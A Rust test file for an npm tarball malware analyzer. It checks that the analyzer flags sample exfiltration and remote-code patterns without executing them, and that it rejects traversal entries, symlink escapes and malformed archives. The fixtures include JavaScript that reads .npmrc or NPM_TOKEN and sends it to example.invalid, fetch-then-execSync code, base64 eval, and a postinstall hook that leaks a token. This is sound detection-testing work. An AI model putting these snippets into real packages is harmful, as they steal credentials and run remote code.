//! Controlled archive fixtures exercise the analyzer without executing payloads.
#![allow(clippy::unwrap_used, clippy::expect_used)]
use std::io::Write;
use zoli_inspect::{Limits, Report};
use zoli_intel::model::Identity;

fn identity() -> Identity {
    Identity {
        ecosystem: "npm".into(),
        name: "fixture".into(),
        version: "1.0.0".into(),
        registry: "https://registry.npmjs.org".into(),
        ..Default::default()
    }
}
fn archive(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut tar = tar::Builder::new(Vec::new());
    for (path, contents) in files {
        let mut header = tar::Header::new_gnu();
        header.set_size(contents.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        tar.append_data(&mut header, path, *contents).unwrap();
    }
    let tar = tar.into_inner().unwrap();
    let mut gzip = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    gzip.write_all(&tar).unwrap();
    gzip.finish().unwrap()
}
fn inspect(source: &str) -> Report {
    let bytes = archive(&[
        (
            "package/package.json",
            br#"{"name":"fixture","version":"1.0.0","main":"index.js"}"#,
        ),
        ("package/index.js", source.as_bytes()),
    ]);
    zoli_inspect::inspect(&bytes, identity(), &Limits::default())
}
#[test]
fn supported_sources_have_located_flow_evidence() {
    let cases = [
        (
            "const fs = require('node:fs');\nconst secret = fs.readFileSync('/home/user/.npmrc','utf8');\nfetch('https://example.invalid', {body: secret});",
            "ZOLI-LOCAL-001",
            3,
        ),
        (
            "import {execSync as run} from 'node:child_process';\nconst response = await fetch('https://example.invalid');\nconst code = await response.text();\nrun(code);",
            "ZOLI-LOCAL-002",
            4,
        ),
        (
            "const encoded = 'Y29uc29sZS5sb2coMSk=';\nconst decoded = Buffer.from(encoded, 'base64').toString('utf8');\neval(decoded);",
            "ZOLI-LOCAL-003",
            3,
        ),
        (
            "import {post as send} from 'axios';\nconst {NPM_TOKEN: token} = process.env;\nsend('https://example.invalid',token);",
            "ZOLI-LOCAL-001",
            3,
        ),
    ];
    for (source, rule, line) in cases {
        let report = inspect(source);
        assert!(report.complete, "{rule}: {:?}", report.gaps);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == rule && f.line == line && f.file == "package/index.js"),
            "{rule}: {:?}",
            report.findings
        );
        let encoded = serde_json::to_string(&report).unwrap();
        assert!(
            !encoded.contains("Y29uc29s") && !encoded.contains("/home/user/.npmrc"),
            "source values leaked into evidence"
        );
    }
}
#[test]
fn benign_networking_comments_shadowing_and_eval_do_not_become_malware() {
    for source in [
        "fetch('https://example.invalid', {body: 'public data'});",
        "// fetch(url, process.env.NPM_TOKEN)\nconst example = 'eval(Buffer.from(...))';",
        "function fetch(url, data) { return data; } fetch('local', process.env.NPM_TOKEN);",
        "function check(process) { fetch('https://example.invalid', process.env.NPM_TOKEN); }",
        "eval('1 + 2');",
        "const a=Buffer.from('aGVsbG8=','base64').toString();console.log(a);",
        "const a='https';const b='://example.invalid';fetch(a+b);",
    ] {
        let report = inspect(source);
        assert!(report.complete, "{:?}", report.gaps);
        assert!(
            report
                .findings
                .iter()
                .all(|f| f.severity == "informational"),
            "{source}: {:?}",
            report.findings
        );
    }
}
#[test]
fn typescript_jsx_and_inline_hooks_are_parsed_without_execution() {
    let bytes = archive(&[
        ("package/package.json", br#"{"name":"fixture","version":"1.0.0","scripts":{"postinstall":"node -e 'fetch(\"https://example.invalid\", {body: process.env.NPM_TOKEN})'"}}"#),
        ("package/component.tsx", b"type Props = {name: string}; export const View = (p: Props) => <div>{p.name}</div>;"),
    ]);
    let report = zoli_inspect::inspect(&bytes, identity(), &Limits::default());
    assert!(report.complete, "{:?}", report.gaps);
    assert_eq!(report.source_files, 2);
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id == "ZOLI-LOCAL-001" && f.file == "package/package.json")
    );
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id == "ZOLI-LOCAL-101")
    );
}
#[test]
fn unsupported_content_and_parse_errors_are_incomplete() {
    for (name, contents) in [
        ("payload.wasm", b"\0asm".as_slice()),
        ("payload.dat", b"\x7fELF"),
        ("install.sh", b"#!/bin/sh\necho hello"),
        ("broken.js", b"const = ;"),
        ("disguised.js", b"#!/bin/sh # node\nls"),
        ("opaque.enc", b"opaque encrypted bytes"),
        ("archive.zip", b"PK\x03\x04"),
    ] {
        let bytes = archive(&[
            (
                "package/package.json",
                br#"{"name":"fixture","version":"1.0.0"}"#,
            ),
            (&format!("package/{name}"), contents),
        ]);
        let report = zoli_inspect::inspect(&bytes, identity(), &Limits::default());
        assert!(!report.complete && !report.gaps.is_empty(), "{name}");
    }
}
#[test]
fn exports_are_checked_and_environment_collections_are_traced() {
    let report = inspect("fetch('https://example.invalid',{body:JSON.stringify(process.env)});");
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id == "ZOLI-LOCAL-001")
    );
    assert!(
        inspect("fetch('https://example.invalid',{body:process.env.NODE_ENV});")
            .findings
            .is_empty()
    );
    for (target, complete) in [
        ("./index.js", true),
        ("./*.js", true),
        ("./missing.js", false),
        ("../outside.js", false),
    ] {
        let manifest=serde_json::to_vec(&serde_json::json!({"name":"fixture","version":"1.0.0","exports":{"import":target,"require":"./index.js"}})).unwrap();
        let bytes = archive(&[
            ("package/package.json", &manifest),
            ("package/index.js", b"module.exports=1;"),
        ]);
        let report = zoli_inspect::inspect(&bytes, identity(), &Limits::default());
        assert_eq!(report.complete, complete, "{target}: {:?}", report.gaps);
    }
}
#[test]
fn invalid_identity_duplicate_paths_and_budgets_never_complete() {
    let manifest = br#"{"name":"fixture","version":"1.0.0"}"#;
    let bytes = archive(&[
        ("package/package.json", manifest),
        ("package/a.js", b"1"),
        ("package/a.js", b"2"),
    ]);
    assert!(!zoli_inspect::inspect(&bytes, identity(), &Limits::default()).complete);
    let bytes = archive(&[
        ("package/package.json", manifest),
        ("package/index.js", &vec![b' '; 4096]),
    ]);
    for limits in [
        Limits {
            max_expanded_bytes: 128,
            ..Default::default()
        },
        Limits {
            max_files: 1,
            ..Default::default()
        },
        Limits {
            max_source_bytes: 100,
            ..Default::default()
        },
        Limits {
            max_artifact_bytes: 10,
            ..Default::default()
        },
    ] {
        assert!(!zoli_inspect::inspect(&bytes, identity(), &limits).complete);
    }
    let mut id = identity();
    id.version = "2.0.0".into();
    assert!(!zoli_inspect::inspect(&bytes, id, &Limits::default()).complete);
    assert!(!zoli_inspect::inspect(b"not a tarball", identity(), &Limits::default()).complete);
}
#[test]
fn traversal_links_and_outside_root_entries_are_rejected() {
    for name in [
        "../escape",
        "/absolute",
        "package/../escape",
        "package\\escape",
    ] {
        let mut header = tar::Header::new_gnu();
        header.set_size(1);
        header.set_mode(0o644);
        header.as_mut_bytes()[..name.len()].copy_from_slice(name.as_bytes());
        header.set_cksum();
        let mut tar = tar::Builder::new(Vec::new());
        tar.append(&header, b"x".as_slice()).unwrap();
        let report =
            zoli_inspect::inspect(&tar.into_inner().unwrap(), identity(), &Limits::default());
        assert!(!report.complete, "{name}");
    }
    let mut header = tar::Header::new_gnu();
    header.set_path("package/link").unwrap();
    header.set_entry_type(tar::EntryType::Symlink);
    header.set_link_name("/tmp/escape").unwrap();
    header.set_size(0);
    header.set_mode(0o777);
    header.set_cksum();
    let mut tar = tar::Builder::new(Vec::new());
    tar.append(&header, b"".as_slice()).unwrap();
    assert!(
        !zoli_inspect::inspect(&tar.into_inner().unwrap(), identity(), &Limits::default()).complete
    );
    let bytes = archive(&[
        (
            "package/package.json",
            br#"{"name":"fixture","version":"1.0.0"}"#,
        ),
        ("outside.js", b"1"),
    ]);
    assert!(!zoli_inspect::inspect(&bytes, identity(), &Limits::default()).complete);
}

#[test]
fn every_truncated_gzip_prefix_and_corrupt_footer_refuses_completion() {
    let bytes = archive(&[
        (
            "package/package.json",
            br#"{"name":"fixture","version":"1.0.0","main":"index.js"}"#,
        ),
        ("package/index.js", b"module.exports = 42;"),
    ]);
    assert!(zoli_inspect::inspect(&bytes, identity(), &Limits::default()).complete);
    for length in 0..bytes.len() {
        let report = zoli_inspect::inspect(&bytes[..length], identity(), &Limits::default());
        assert!(
            !report.complete && !report.gaps.is_empty(),
            "prefix {length}"
        );
    }
    for index in bytes.len() - 8..bytes.len() {
        let mut corrupt = bytes.clone();
        corrupt[index] ^= 1;
        let report = zoli_inspect::inspect(&corrupt, identity(), &Limits::default());
        assert!(
            !report.complete && !report.gaps.is_empty(),
            "footer {index}"
        );
    }
}

#[test]
fn concatenated_gzip_members_cannot_hide_a_second_package_root() {
    let mut bytes = archive(&[
        (
            "package/package.json",
            br#"{"name":"fixture","version":"1.0.0"}"#,
        ),
        ("package/index.js", b"module.exports = 1;"),
    ]);
    assert!(zoli_inspect::inspect(&bytes, identity(), &Limits::default()).complete);
    bytes.extend(archive(&[(
        "package.json",
        br#"{"name":"hidden","version":"1.0.0"}"#,
    )]));
    let report = zoli_inspect::inspect(&bytes, identity(), &Limits::default());
    assert!(!report.complete && !report.gaps.is_empty());
}

#[test]
fn duplicate_manifest_fields_and_non_utf8_sources_are_incomplete() {
    for (manifest, source) in [
        (
            br#"{"name":"other","name":"fixture","version":"1.0.0"}"#.as_slice(),
            b"module.exports = 1;".as_slice(),
        ),
        (
            br#"{"name":"fixture","version":"2.0.0","version":"1.0.0"}"#,
            b"module.exports = 1;",
        ),
        (
            br#"{"name":"fixture","version":"1.0.0"}"#,
            b"// invalid source encoding\n\xff",
        ),
    ] {
        let bytes = archive(&[
            ("package/package.json", manifest),
            ("package/index.js", source),
        ]);
        let report = zoli_inspect::inspect(&bytes, identity(), &Limits::default());
        assert!(!report.complete && !report.gaps.is_empty());
    }
}

#[test]
fn exact_archive_resource_limits_pass_and_one_byte_or_entry_less_refuses() {
    let manifest = br#"{"name":"fixture","version":"1.0.0"}"#;
    let source = b"// padding makes this source longer than the manifest\nmodule.exports = 1;";
    let bytes = archive(&[
        ("package/package.json", manifest),
        ("package/index.js", source),
    ]);
    let exact = Limits {
        max_artifact_bytes: bytes.len(),
        max_expanded_bytes: manifest.len() + source.len(),
        max_source_bytes: source.len(),
        max_files: 2,
        ..Default::default()
    };
    let report = zoli_inspect::inspect(&bytes, identity(), &exact);
    assert!(report.complete, "{:?}", report.gaps);
    for limits in [
        Limits {
            max_artifact_bytes: exact.max_artifact_bytes - 1,
            ..exact.clone()
        },
        Limits {
            max_expanded_bytes: exact.max_expanded_bytes - 1,
            ..exact.clone()
        },
        Limits {
            max_source_bytes: exact.max_source_bytes - 1,
            ..exact.clone()
        },
        Limits {
            max_files: exact.max_files - 1,
            ..exact.clone()
        },
    ] {
        let report = zoli_inspect::inspect(&bytes, identity(), &limits);
        assert!(!report.complete && !report.gaps.is_empty());
    }
}
